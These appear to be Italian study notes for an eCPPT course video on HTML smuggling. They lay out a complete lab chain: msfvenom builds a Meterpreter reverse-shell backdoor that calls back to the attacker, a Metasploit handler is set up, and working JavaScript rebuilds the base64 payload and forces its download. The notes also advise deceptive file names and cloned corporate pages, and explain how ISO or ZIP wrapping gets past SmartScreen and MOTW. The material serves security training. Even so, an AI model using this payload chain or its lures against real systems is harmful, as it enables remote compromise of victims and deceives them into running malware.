# 023 — File Smuggling with HTML & JavaScript (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 23/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [023_File Smuggling with HTML & JavaScript.txt](023_File Smuggling with HTML & JavaScript.txt) · [023_File Smuggling with HTML & JavaScript.srt](023_File Smuggling with HTML & JavaScript.srt)

## Concetti chiave

- **HTML Smuggling** = tecnica di **delivery** in cui il payload (exe/script/doc) è **codificato base64 dentro JavaScript** in una pagina HTML, decodificato lato client in un **Blob** e salvato sul filesystem via `<a download>`.
- Bypassa **email filters, firewall, web proxy, IDS, EDR network-based** perché in transito il file è solo **testo HTML/JS** (mai un binario riconoscibile).
- Vettori: **email** (HTML body o attachment) o **website** compromesso/clonato.
- Tecnica MITRE ATT&CK **T1027.006 — Obfuscated Files or Information: HTML Smuggling**.
- API JS chiave: **`Blob`**, **`URL.createObjectURL`**, **`<a>.click()`** programmatico.
- Tipo MIME: **`application/octet-stream`** (forza download).
- Tre fasi: **embed → delivery → reconstruct & execute**.

## Spiegazione approfondita

### Perché funziona
- Gateway email/web filtrano in base a **content-type** e a **firme binari** (PE header, magic bytes).
- Il payload **non attraversa la rete come binario**: viaggia come stringa base64 dentro JavaScript.
- Il **browser** del target ricostruisce il file localmente (mai un download esterno) → nessun gateway intermedio può ispezionarlo.

### Workflow (lab INE)
**Setup**: tab Kali (attacker) + tab Windows (target). IP dinamici.

**Step 1 — Generate payload**:
```bash
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=<KALI_IP> LPORT=4444 \
  -f exe -o backdoor.exe
```

**Step 2 — Encode in base64** (singola riga, no line break):
```bash
base64 -w0 backdoor.exe > base64.txt
cat base64.txt    # stringa enorme, una sola riga
```
> `-w0` = no wrap → essenziale, altrimenti JS atob() fallisce.

**Step 3 — Setup MSF handler con resource script**:
```
# /root/handler.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run
```
```bash
msfconsole -r handler.rc
```

**Step 4 — Costruire `index.html` con smuggling**:
```html
<html>
<head>
<title>Documento aziendale</title>
<script>
function base64ToArrayBuffer(b64) {
  var bin = atob(b64);
  var len = bin.length;
  var bytes = new Uint8Array(len);
  for (var i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

// === PAYLOAD: incolla qui la stringa base64 di backdoor.exe ===
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA...';
var data = base64ToArrayBuffer(file);

var blob = new Blob([data], {type: 'application/octet-stream'});
var fileName = 'msf_stage.exe';

var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';

var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
</script>
</head>
<body><h1>Loading...</h1></body>
</html>
```
Salvare in `/var/www/html/index.html`.

**Step 5 — Avviare Apache + listener**:
```bash
sudo service apache2 start
msfconsole -r handler.rc
```

**Step 6 — Vittima**: visita `http://<KALI_IP>/` → browser scarica automaticamente `msf_stage.exe` (gli può sembrare "Save As" dialog) → la apre → Meterpreter session sul Kali.

### Anatomia del JavaScript
1. **`atob(b64)`** decodifica base64 → binary string.
2. Loop crea **`Uint8Array`** byte-per-byte.
3. **`new Blob([data], {type:'application/octet-stream'})`** = oggetto file in memoria.
4. **`URL.createObjectURL(blob)`** = URL `blob:` accessibile dal DOM.
5. **`<a>` invisibile** con `href=url` + `download=filename` + `click()` programmatico = download forzato.
6. **`revokeObjectURL`** libera memoria.

### Pretexting consigliato
- Pagina HTML clone di sito legittimo aziendale.
- Messaggio "Il documento si sta scaricando, se non si avvia clicca qui".
- Nome file persuasivo (`Q4_Report.exe`, `Setup_Update.exe`, `Invoice.pdf.exe`).

### Browser behavior moderni
- Chrome/Edge/Firefox spesso mostrano warning **"file potenzialmente dannoso"** per `.exe`.
- Mitigazioni attaccante:
  - Usare estensioni meno warnose: `.iso`, `.img`, `.lnk`, `.hta`, `.scr`, doc Office.
  - Wrappare in **`.zip`/`.7z`** (genericissimo, bypassa SmartScreen).
  - **Container `.iso`**: Windows monta automaticamente, contenuto eseguito non eredita MOTW.

### Varianti
- Payload può essere **qualsiasi file**: Office doc con macro, HTA, LNK, PowerShell script, ISO.
- Smuggling via **email HTML body** (Outlook/Gmail con immagini → spesso JS bloccato; più realistico è attachment HTML).
- Multi-stage: HTML smuggle un **dropper minimal** che poi scarica lo stage reale.

### Riferimento
HTML smuggling è stato pubblicizzato da Microsoft come tecnica usata da **NOBELIUM/APT29**, **Trickbot**, **Qakbot** → vettore APT-grade.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `msfvenom -p ... -f exe -o backdoor.exe` | Stage da smuggle |
| `base64 -w0 file > out.txt` | Encode (no wrap!) |
| `atob(b64)` | JS base64 decode |
| `new Uint8Array(...)` | Buffer binario JS |
| `new Blob([data], {type:'application/octet-stream'})` | File in memoria |
| `URL.createObjectURL(blob)` | URL `blob:` |
| `<a download>` + `.click()` | Trigger download |
| Apache hosting | `service apache2 start` (root in `/var/www/html/`) |
| Handler | `msfconsole -r handler.rc` |

## Esempi pratici

```bash
# Pipeline minimal (Kali)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o stage.exe
base64 -w0 stage.exe > b64.txt
# inserire contenuto b64.txt nella var file di index.html
sudo cp index.html /var/www/html/
sudo service apache2 start
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/meterpreter/reverse_tcp; \
  set LHOST 10.0.0.5; set LPORT 4444; run"
```

```html
<!-- Snippet minimal -->
<script>
var f='__BASE64_HERE__';
var b=atob(f),u=new Uint8Array(b.length);
for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);
var blob=new Blob([u],{type:'application/octet-stream'});
var a=document.createElement('a');
a.href=URL.createObjectURL(blob);a.download='update.exe';a.click();
</script>
```

## Punti d'attenzione per l'esame eCPPT

- **HTML Smuggling** = tecnica di **delivery**, NON di esecuzione.
- Bypassa filtri rete perché il binario è in transito come **base64 in HTML/JS**.
- API JS chiave: **`Blob`**, **`URL.createObjectURL`**, **`<a download>` + `.click()`**.
- MIME forzato: **`application/octet-stream`**.
- `base64 -w0` (NO wrap) è fondamentale per evitare line-break che rompono `atob()`.
- MITRE ATT&CK ID: **T1027.006**.
- Usato da APT reali (NOBELIUM, Qakbot, Trickbot) → tecnica APT-grade, plausibile in scenario red team / esame practical.
- Combinato con **ISO/ZIP wrapping** per bypass MOTW/SmartScreen.

## Collegamenti con altri video

- Precedente: [[022_Automating Macro Development with MacroPack - Part 2]]
- Prossimo: [[024_Initial Access Via Spear Phishing Attachment]]
- Altri vettori di delivery: [[08_Phishing with Gophish - Part 1]] · [[09_Phishing with Gophish - Part 2]]
- Browser-based delivery alternativa: [[025_Establishing a Shell Through the Victim's Browser]] (BeEF + fake update).
- Payload da smuggle: [[014_Weaponizing VBA Macros with MSF]] · [[020_HTA Attacks]].
